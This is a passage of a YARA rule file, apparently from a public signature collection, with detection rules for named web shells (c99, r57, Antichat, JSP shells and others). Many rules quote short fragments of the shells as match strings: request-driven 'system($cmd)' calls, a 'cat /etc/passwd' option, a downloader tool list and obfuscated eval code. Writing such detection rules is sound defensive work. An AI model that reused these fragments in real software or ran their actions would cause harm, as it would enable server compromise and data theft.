		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1220-L1233"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5391c4a8af1ede757ba9d28865e75853"
		logic_hash = "e48d4e2d14a3605fd9dda03630820a0fb53d893cc4d283739fde11f9ab7d9d1e"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_K81 {
    meta:
		description = "Web Shell - file k81.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1235-L1249"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "41efc5c71b6885add9c1d516371bd6af"
		logic_hash = "f9c6b5bec9313c6fd059055fa18332675838419bba3348bb852b50806f26ccb2"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);" fullword
		$s9 = "if(cmd.equals(\"Szh0ZWFt\")){out.print(\"[S]\"+dir+\"[E]\");}" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_ASP_Zehir {
    meta:
		description = "Web Shell - file zehir.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1250-L1263"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0061d800aee63ccaf41d2d62ec15985d"
		logic_hash = "90920258017cf189da128dce477e71f0040bc66aefa6f018f64db64d22f60ae5"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "Response.Write \"<font face=wingdings size=3><a href='\"&dosyaPath&\"?status=18&"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Worse_Linux_Shell_1 {
    meta:
		description = "Web Shell - file Worse Linux Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		old_rule_name = "webshell_Worse_Linux_Shell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1264-L1278"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8338c8d9eab10bd38a7116eb534b5fa2"
		logic_hash = "a24e7ae7c722da7f265f032315b1e8e402c2fc4a2a54a685671a9e52124f6553"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "system(\"mv \".$_FILES['_upl']['tmp_name'].\" \".$currentWD"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Zacosmall {
    meta:
		description = "Web Shell - file zacosmall.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1279-L1292"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5295ee8dc2f5fd416be442548d68f7a6"
		logic_hash = "739d58e3ab6712c703e0cb0e0070afec3376844b77ed081a5d12407cabb62319"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd).\"</strong><hr>"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Liz0Zim_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit {
    meta:
		description = "Web Shell - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1293-L1306"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c6eeacbe779518ea78b8f7ed5f63fc11"
		logic_hash = "9630fc0371193bfbd0bd4fb15856477e7739fc9f11ee539d119ee837b1a54502"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Redirect {
    meta:
		description = "Web Shell - file redirect.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1307-L1320"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "97da83c6e3efbba98df270cc70beb8f8"
		logic_hash = "b16026623fe7802db9823ad4a3dab051747eea6bd41ce72a0c8c6757bfa2c6f7"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "var flag = \"?txt=\" + (document.getElementById(\"dl\").checked ? \"2\":\"1\" "

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_Cmdjsp {
    meta:
		description = "Web Shell - file cmdjsp.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1321-L1334"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b815611cc39f17f05a73444d699341d4"
		logic_hash = "b4822e47a27c598be746ac71bf9b60dafe08d50c83a2dfee5e40ea384fcff21a"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Java_Shell {
    meta:
		description = "Web Shell - file Java Shell.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1335-L1349"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "36403bc776eb12e8b7cc0eb47c8aac83"
		logic_hash = "0d313ff81a36b456326df0054853c31d69710fc142fcfa65747691238af4e635"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "public JythonShell(int columns, int rows, int scrollback) {" fullword
		$s9 = "this(null, Py.getSystemState(), columns, rows, scrollback);" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Asp_1D {
    meta:
		description = "Web Shell - file 1d.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1350-L1363"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "fad7504ca8a55d4453e552621f81563c"
		logic_hash = "85b17fde8fb535b64e5eabc887428d9b73adc5bc6741a3a387f235a8b0c6089a"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "+9JkskOfKhUxZJPL~\\(mD^W~[,{@#@&EO"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_Ixrbe {
    meta:
		description = "Web Shell - file IXRbE.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1364-L1377"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e26e7e0ebc6e7662e1123452a939e2cd"
		logic_hash = "8710d092b81c5de1e328ad6e57e5c4a25748cc92844198038c103dabc1e76e77"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_PHP_G5 {
    meta:
		description = "Web Shell - file G5.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1378-L1391"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "95b4a56140a650c74ed2ec36f08d757f"
		logic_hash = "2edffbea5142ef146cec57cb88b473532f56ab3e95151c5648eaeabe6a75feda"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "echo \"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</op"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_PHP_R57142 {
    meta:
		description = "Web Shell - file r57142.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1392-L1405"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0911b6e6b8f4bcb05599b2885a7fe8a8"
		logic_hash = "3afa0463de3acb12480dba1b2ab9cd53fca88216ba54c5e044e48ebd84bf17bd"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_Tree {
    meta:
		description = "Web Shell - file tree.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1406-L1420"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "bcdf7bbf7bbfa1ffa4f9a21957dbcdfa"
		logic_hash = "180aa4572a42d23f3e44589f876356ec973fd64cdd53bac69936b93699888ac2"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "$('#tt2').tree('options').url = \"selectChild.action?checki"
		$s6 = "String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+requ"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_C99Madshell_V_3_0_Smowu {
    meta:
		description = "Web Shell - file smowu.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1421-L1435"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "74e1e7c7a6798f1663efb42882b85bee"
		logic_hash = "d84a5c573b89790efdbe67a684feb7db88521027e86b7588f090696fd90cbc87"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Enter ::</b><for"
		$s8 = "<p><font color=red>Wordpress Not Found! <input type=text id=\"wp_pat\"><input ty"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Simple_Backdoor {
    meta:
		description = "Web Shell - file simple-backdoor.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1436-L1451"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "f091d1b9274c881f8e41b2f96e6b9936"
		logic_hash = "252285e8a796757235d775427e5a73980d065c1221190545428910a77f46bb9a"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$cmd = ($_REQUEST['cmd']);" fullword
		$s1 = "if(isset($_REQUEST['cmd'])){" fullword
		$s4 = "system($cmd);" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Macker_S_Private_Phpshell {
    meta:
		description = "Web Shell - file Macker's Private PHPShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1466-L1481"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e24cbf0e294da9ac2117dc660d890bb9"
		logic_hash = "4bccc1aca8698e601133436a55538c08e3e1fa113a0776c04590eaf4a10fd309"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "echo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&n"
		$s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
		$s7 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Antichat_Shell_V1_3_2 {
    meta:
		description = "Web Shell - file Antichat Shell v1.3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1482-L1495"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "40d0abceba125868be7f3f990f031521"
		logic_hash = "d5a1dc31f442f8db7771ee64164436f6c562ef9f4a203a1e2006d37f9df91846"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><m"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Safe_Mode_Breaker {
    meta:
		description = "Web Shell - file Safe mode breaker.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1496-L1510"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5bd07ccb1111950a5b47327946bfa194"
		logic_hash = "4adcefc05413a02653a2a405791345a1a76058a39f6e2b03765c4485f7c6b106"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "preg_match(\"/SAFE\\ MODE\\ Restriction\\ in\\ effect\\..*whose\\ uid\\ is("
		$s6 = "$path =\"{$root}\".((substr($root,-1)!=\"/\") ? \"/\" : NULL)."

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Sst_Sheller {
    meta:
		description = "Web Shell - file Sst-Sheller.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1511-L1525"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d93c62a0a042252f7531d8632511ca56"
		logic_hash = "4faac0b22fec809f2100bad200ba1f9fb9e16fab743e1b1cbfe0b80c6d2fee32"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "echo \"<a href='?page=filemanager&id=fm&fchmod=$dir$file'>"
		$s3 = "<? unlink($filename); unlink($filename1); unlink($filename2); unlink($filename3)"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_List {
    meta:
		description = "Web Shell - file list.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1526-L1541"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1ea290ff4259dcaeb680cec992738eda"
		logic_hash = "5641bff0ec161fe72e502641b6138186d541ebfcbf499e0295a61f9f6f085654"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
		$s2 = "out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fn"
		$s7 = "if(flist[i].canRead() == true) out.print(\"r\" ); else out.print(\"-\");" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Phpjackal_V1_5 {
    meta:
		description = "Web Shell - file PHPJackal v1.5.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1542-L1556"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d76dc20a4017191216a0315b7286056f"
		logic_hash = "457bc71cb8e684dafb14b1c5d2faa4366cedce5eba9545493be2b1d49daf98b6"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "echo \"<center>${t}MySQL cilent:</td><td bgcolor=\\\"#333333\\\"></td></tr><form"
		$s8 = "echo \"<center>${t}Wordlist generator:</td><td bgcolor=\\\"#333333\\\"></td></tr"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Customize {
    meta:
		description = "Web Shell - file customize.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1557-L1570"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d55578eccad090f30f5d735b8ec530b1"
		logic_hash = "462d97427793ef6e897b33f4fd02d452ad8cd11ddef21aa25d13efc981eb3afb"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_S72_Shell_V1_1_Coding {
    meta:
		description = "Web Shell - file s72 Shell v1.1 Coding.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1571-L1584"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c2e8346a5515c81797af36e7e4a3828e"
		logic_hash = "fd200d8aa347242546a1da311edc61ceebaec5f7d6b4fe2f49f069b36689f547"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "<font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buradan Dosya "

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_Sys3 {
    meta:
		description = "Web Shell - file sys3.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1585-L1600"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b3028a854d07674f4d8a9cf2fb6137ec"
		logic_hash = "14b0ac1b1b8538b0c05dcd0a8b7129fdcad2e595ea00630bd55cee6dff596d4f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">" fullword
		$s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
		$s9 = "<%@page contentType=\"text/html;charset=gb2312\"%>" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_Guige02 {
    meta:
		description = "Web Shell - file guige02.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1601-L1615"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a3b8b2280c56eaab777d633535baf21d"
		logic_hash = "c214e50b209970c03d389d97673901ec44b2727e5c7588e5e4d0a644cc691423"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\"#fff"
		$s1 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%><%!private"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Php_Ghost {
    meta:
		description = "Web Shell - file ghost.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1616-L1631"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "38dc8383da0859dca82cf0c943dbf16d"
		logic_hash = "9a7635d313345e7b7cb7424726ed62015afd78412b504e406155f85c4cdf623f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<?php $OOO000000=urldecode('%61%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64'"
		$s6 = "//<img width=1 height=1 src=\"http://websafe.facaiok.com/just7z/sx.asp?u=***.***"
		$s7 = "preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'(KmU(\"" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Winx_Shell {
    meta:
		description = "Web Shell - file WinX Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1632-L1646"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "17ab5086aef89d4951fe9b7c7a561dda"
		logic_hash = "e6dd5178cafccca751dd3f2e36206acd214a65b2e0783a738a104b3dc680ca21"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">Filenam"
		$s8 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">File: </"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Crystal_Crystal {
    meta:
		description = "Web Shell - file Crystal.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
